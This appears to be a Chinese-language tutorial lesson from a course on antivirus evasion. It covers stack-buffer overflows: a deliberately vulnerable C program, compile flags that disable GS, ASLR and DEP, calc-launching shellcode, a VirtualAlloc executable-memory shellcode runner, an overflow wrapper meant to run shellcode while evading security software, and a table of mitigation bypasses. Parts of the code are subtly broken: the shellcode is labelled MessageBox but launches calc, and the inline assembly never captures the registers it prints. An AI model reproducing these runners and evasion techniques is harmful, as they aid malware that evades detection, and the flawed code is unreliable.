# 课时02：栈溢出调用CALL

## 1. 课程概述

### 1.1 学习目标

通过本课时的学习，你将掌握：
- 理解函数调用时的栈结构
- 掌握栈溢出漏洞的原理
- 学会利用栈溢出执行ShellCode
- 理解如何在免杀中应用栈溢出技术

### 1.2 前置知识

- C/C++基础语法
- 汇编语言基础（x86/x64）
- 内存布局和地址空间概念
- ShellCode基本概念

---

## 2. 名词解释

### 2.1 核心术语

| 术语 | 英文 | 说明 |
|------|------|------|
| **栈/堆栈** | Stack | 后进先出的内存区域，用于存储局部变量和函数调用信息 |
| **栈帧** | Stack Frame | 单个函数调用在栈上占据的内存区域 |
| **返回地址** | Return Address | 函数执行完毕后跳转的目标地址 |
| **栈溢出** | Stack Overflow/Buffer Overflow | 向栈缓冲区写入超过其大小的数据 |
| **EIP/RIP** | Instruction Pointer | 指令指针寄存器，指向下一条要执行的指令 |
| **ESP/RSP** | Stack Pointer | 栈指针寄存器，指向栈顶 |
| **EBP/RBP** | Base Pointer | 基址指针寄存器，指向当前栈帧底部 |
| **NOP Sled** | NOP滑行 | 一系列NOP指令，用于增加命中ShellCode的概率 |

### 2.2 寄存器对照表

| 32位 | 64位 | 功能 |
|------|------|------|
| EAX | RAX | 累加器/返回值 |
| EBX | RBX | 基址寄存器 |
| ECX | RCX | 计数器/第1参数(64位) |
| EDX | RDX | 数据寄存器/第2参数(64位) |
| ESI | RSI | 源索引 |
| EDI | RDI | 目标索引 |
| ESP | RSP | 栈指针 |
| EBP | RBP | 基址指针 |
| EIP | RIP | 指令指针 |

---

## 3. 必备工具

### 3.1 开发工具

| 工具 | 用途 | 下载地址 |
|------|------|----------|
| **Visual Studio** | 编译C/C++代码 | https://visualstudio.microsoft.com/ |
| **MinGW** | GCC编译器 | https://www.mingw-w64.org/ |
| **NASM** | 汇编编译器 | https://www.nasm.us/ |

### 3.2 调试工具

| 工具 | 用途 | 下载地址 |
|------|------|----------|
| **x64dbg** | 用户态调试 | https://x64dbg.com/ |
| **WinDbg** | 高级调试 | https://docs.microsoft.com/windows-hardware/drivers/debugger/ |
| **IDA Pro** | 反汇编分析 | https://hex-rays.com/ida-pro/ |
| **Ghidra** | 免费反编译工具 | https://ghidra-sre.org/ |

### 3.3 辅助工具

| 工具 | 用途 |
|------|------|
| **msfvenom** | 生成ShellCode |
| **ROPgadget** | 寻找ROP gadgets |
| **pattern_create** | 生成定位模式 |

---

## 4. 栈结构详解

### 4.1 函数调用栈布局（32位）

```
高地址
+------------------+
|    参数 N        |  ← [ebp + 4 + 4*N]
+------------------+
|    ...           |
+------------------+
|    参数 2        |  ← [ebp + 0x0C]
+------------------+
|    参数 1        |  ← [ebp + 0x08]
+------------------+
|   返回地址      |  ← [ebp + 0x04]  **我们的目标**
+------------------+
|   保存的 EBP    |  ← [ebp + 0x00] ← EBP指向这里
+------------------+
|   局部变量 1     |  ← [ebp - 0x04]
+------------------+
|   局部变量 2     |  ← [ebp - 0x08]
+------------------+
|    ...           |
+------------------+
|   缓冲区         |  ← [ebp - 0x??]  **溢出起点**
+------------------+  ← ESP指向这里
低地址
```

### 4.2 函数调用过程

```asm
; 调用者 (Caller)
call MyFunction      ; 1. 将返回地址压栈，跳转到函数

; 被调用者 (Callee) - 函数序言 (Prologue)
MyFunction:
    push ebp          ; 2. 保存旧的EBP
    mov ebp, esp      ; 3. 设置新的栈帧基址
    sub esp, 0x20     ; 4. 为局部变量分配空间
    
    ; ... 函数体 ...
    
    ; 函数尾声 (Epilogue)
    mov esp, ebp      ; 5. 恢复栈指针
    pop ebp           ; 6. 恢复旧的EBP
    ret               ; 7. 弹出返回地址，跳转执行
```

### 4.3 64位调用约定差异

| 特性 | 32位 (cdecl) | 64位 (Windows fastcall) |
|------|---------------|---------------------------|
| 参数传递 | 全部通过栈 | 前4个用RCX,RDX,R8,R9，其余用栈 |
| 栈对齐 | 4字节 | 16字节 |
| 影子空间 | 无 | 需要0x20字节 |

---

## 5. 栈溢出原理

### 5.1 漏洞代码示例

```c
#include <stdio.h>
#include <string.h>

// 漏洞函数：没有边界检查
void vulnerable_function(char *input) {
    char buffer[64];  // 64字节缓冲区
    
    // 危险！strcpy不检查边界
    strcpy(buffer, input);  // 如果input > 64字节，将溢出
    
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    vulnerable_function(argv[1]);
    return 0;
}
```

### 5.2 溢出过程图解

```
正常情况:                    溢出后:
+------------------+           +------------------+
|   返回地址      |           |   ShellCode地址  |  ← 被覆盖!
+------------------+           +------------------+
|   保存的 EBP    |           |   AAAA...       |  ← 被覆盖!
+------------------+           +------------------+
|   buffer[64]     |           |   AAAA...       |  ← 填充数据
|   正常数据      |           |   AAAA...       |
+------------------+           +------------------+
```

### 5.3 计算溢出偏移

```
要覆盖返回地址需要的字节数:
= buffer大小 + 保存的EBP大小
= 64 + 4 (32位) 或 64 + 8 (64位)
= 68字节 (32位)

结构:
[64字节填充] + [4字节覆盖EBP] + [4字节新返回地址]
```

---

## 6. 实现代码

### 6.1 漏洞程序（关闭安全特性）

```c
// vuln.c
#include <stdio.h>
#include <string.h>
#include <windows.h>

// 打印栈信息用于调试
void print_stack_info() {
    void *esp, *ebp;
    
    #ifdef _WIN64
    printf("[*] 64-bit mode\n");
    #else
    __asm {
        mov esp, esp
        mov ebp, ebp
    }
    printf("[*] ESP: 0x%p\n", esp);
    printf("[*] EBP: 0x%p\n", ebp);
    #endif
}

void vulnerable_function(char *input) {
    char buffer[64];
    
    printf("[*] Buffer address: 0x%p\n", buffer);
    printf("[*] Input length: %zu\n", strlen(input));
    
    // 漏洞点
    strcpy(buffer, input);
    
    printf("[*] After copy\n");
}

int main(int argc, char *argv[]) {
    printf("========== Stack Overflow Demo ==========\n");
    
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    print_stack_info();
    vulnerable_function(argv[1]);
    
    printf("[*] Normal return\n");
    return 0;
}
```

### 6.2 编译命令（关闭安全特性）

```bash
# MSVC - 关闭安全检查
cl.exe /GS- /DYNAMICBASE:NO vuln.c /Fe:vuln.exe

# MinGW - 关闭栈保护和ASLR
gcc -fno-stack-protector -no-pie -z execstack vuln.c -o vuln.exe

# 32位编译
gcc -m32 -fno-stack-protector -no-pie vuln.c -o vuln32.exe
```

### 6.3 ShellCode注入示例

```c
// exploit.c
#include <stdio.h>
#include <string.h>
#include <windows.h>

// 简单的MessageBox ShellCode (32位)
unsigned char shellcode[] = 
    "\x31\xc0"                 // xor eax, eax
    "\x50"                     // push eax
    "\x68\x63\x61\x6c\x63"     // push "calc"
    "\x54"                     // push esp
    "\xbb\xc7\x93\xc2\x77"     // mov ebx, WinExec
    "\xff\xd3"                 // call ebx
    "\x31\xc0"                 // xor eax, eax
    "\x50"                     // push eax
    "\xbb\x12\xcb\x81\x77"     // mov ebx, ExitProcess
    "\xff\xd3";                // call ebx

int main() {
    printf("[*] ShellCode length: %zu\n", sizeof(shellcode) - 1);
    
    // 分配可执行内存
    void *exec = VirtualAlloc(NULL, sizeof(shellcode), 
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    
    if (!exec) {
        printf("[-] VirtualAlloc failed\n");
        return 1;
    }
    
    printf("[*] Executable memory at: 0x%p\n", exec);
    
    // 复制ShellCode
    memcpy(exec, shellcode, sizeof(shellcode));
    
    // 执行ShellCode
    printf("[*] Executing ShellCode...\n");
    ((void(*)())exec)();
    
    return 0;
}
```

---

## 7. 免杀中的应用

### 7.1 为什么用栈溢出调用CALL

1. **混淆执行流程**：ShellCode不是直接调用，而是通过覆盖返回地址
2. **绕过简单的函数指针检测**：不需要显式的函数指针调用
3. **利用卷影攻击**：通过栈溢出触发其他代码执行

### 7.2 实战示例：自构建栈溢出执行

```c
// stack_call.c - 通过栈溢出调用ShellCode
#include <stdio.h>
#include <string.h>
#include <windows.h>

// ShellCode: 弹出计算器
unsigned char shellcode[] = 
    "\x90\x90\x90\x90"  // NOP sled
    "\x90\x90\x90\x90"
    // ... 实际ShellCode ...
    ;

// 利用栈溢出的包装函数
void trigger_overflow() {
    char buffer[64];
    char exploit[128];
    
    // 构造攻击载荷
    memset(exploit, 'A', 68);  // 填充到返回地址
    
    // 设置返回地址指向我们的代码
    // 注意：实际地址需要调试确定
    *(void**)(exploit + 68) = (void*)shellcode;
    
    // 触发溢出
    strcpy(buffer, exploit);
}

int main() {
    // 分配可执行内存给ShellCode
    void *exec = VirtualAlloc(NULL, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    
    printf("[*] ShellCode at: 0x%p\n", exec);
    
    trigger_overflow();
    
    return 0;
}
```

---

## 8. 现代安全机制与绕过

### 8.1 常见安全机制

| 机制 | 英文 | 说明 | 绕过方法 |
|------|------|------|----------|
| **栈保护** | Stack Canary/GS | 在返回地址前放置随机值 | 泄露Canary值或绕过 |
| **DEP** | Data Execution Prevention | 数据区不可执行 | ROP技术 |
| **ASLR** | Address Space Layout Randomization | 地址随机化 | 信息泄露或爆破 |
| **CFG** | Control Flow Guard | 控制流保护 | 找到合法的调用目标 |

### 8.2 检查保护机制

```bash
# 使用dumpbin检查
dumpbin /headers program.exe

# 查看:
# - /GS 栈保护
# - /DYNAMICBASE ASLR
# - /NXCOMPAT DEP
# - /GUARD:CF CFG
```

### 8.3 编译时关闭保护

```bash
# MSVC - 关闭所有保护
cl.exe /GS- /DYNAMICBASE:NO /NXCOMPAT:NO program.c

# 链接器选项
link /DYNAMICBASE:NO /NXCOMPAT:NO /SAFESEH:NO program.obj

# GCC
gcc -fno-stack-protector -no-pie -z execstack program.c
```

---

## 9. 调试技巧

### 9.1 使用x64dbg调试

1. 加载漏洞程序
2. 在`vulnerable_function`设置断点
3. 观察栈窗口中的数据
4. 单步执行，观察返回地址被覆盖

### 9.2 确定偏移量

```python
# 生成唯一模式 (Python)
import struct

def pattern_create(length):
    pattern = ""
    for upper in range(ord('A'), ord('Z')+1):
        for lower in range(ord('a'), ord('z')+1):
            for digit in range(ord('0'), ord('9')+1):
                if len(pattern) >= length:
                    return pattern[:length]
                pattern += chr(upper) + chr(lower) + chr(digit)
    return pattern

def pattern_offset(value):
    pattern = pattern_create(1000)
    # 将EIP值转换为字符串并查找
    needle = struct.pack("<I", value).decode('latin-1')
    return pattern.find(needle)

# 生成1000字节的模式
print(pattern_create(100))

# 假设崩溃时EIP = 0x41326941
print(f"Offset: {pattern_offset(0x41326941)}")
```

---

## 10. 课后作业

### 10.1 基础练习

1. 编译漏洞程序，关闭所有安全保护
2. 使用x64dbg分析栈结构
3. 计算覆盖返回地址需要的偏移量

### 10.2 进阶练习

1. 实现通过栈溢出执行MessageBox
2. 尝试绕过栈保护（Canary泄露）

### 10.3 高级练习

1. 在开启DEP的情况下，使用ROP技术执行ShellCode
2. 绕过ASLR的技术研究

### 10.4 思考题

1. 为什么现代软件很少有可利用的栈溢出？
2. 安全软件如何检测栈溢出攻击？
3. 免杀中使用栈溢出的优势和局限是什么？

---

## 11. 参考资料

- 《0day安全:软件漏洞分析技术》
- 《Hacking: The Art of Exploitation》
- 《The Shellcoder's Handbook》

---

## 12. 下一课预告

下一课我们将学习**“未导出API执行ShellCode”**，内容包括：
- Windows未导出API的概念
- 如何获取未导出API地址
- 利用未导出API绕过安全检测
